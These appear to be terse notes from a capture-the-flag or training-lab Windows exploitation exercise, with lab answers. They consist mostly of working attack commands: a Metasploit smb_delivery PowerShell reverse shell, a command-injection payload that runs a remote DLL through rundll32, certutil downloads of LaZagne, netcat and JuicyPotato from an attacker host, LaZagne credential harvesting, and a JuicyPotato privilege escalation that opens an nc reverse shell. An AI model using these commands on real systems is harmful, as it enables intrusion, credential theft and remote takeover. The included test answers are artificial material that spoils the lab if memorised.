```
sudo msfconsole
search smb_delivery
use 0
set LHOST 10.10.15.5
set SRVHOST 10.10.15.5
set payload windows/x64/powershell_reverse_tcp
run
```

Command Injection: 10.10.15.5 && rundll32.exe \\10.10.15.5\TOESS\test.dll,0

```
shell
wmic qfe
```

**Which two KBs are installed on the target system? (Answer format: 3210000&3210060)
3199986&3200970

**Find the password for the ldapadmin account somewhere on the system.
```
findstr /SI /M "confidential.txt"
certutil.exe -urlcache -f http://10.10.15.176:8000/LaZagne.exe C:\Users\Public\LaZagne.exe
LaZagne.exe
```


**Elevate Privileges
- User has SeImpersonate, so we can use JuicyPotato.exe
```
python3 -m http.server
certutil.exe -urlcache -f http://10.10.15.176:8000/nc.exe C:\Users\Public\nc.exe
certutil.exe -urlcache -f http://10.10.15.176:8000/JuicyPotato.exe C:\Users\Public\JuicyPotato.exe
c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 10.10.15.176 8443 -e cmd.exe" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

**Find confidential.txt
```
dir /S confidential.txt
```
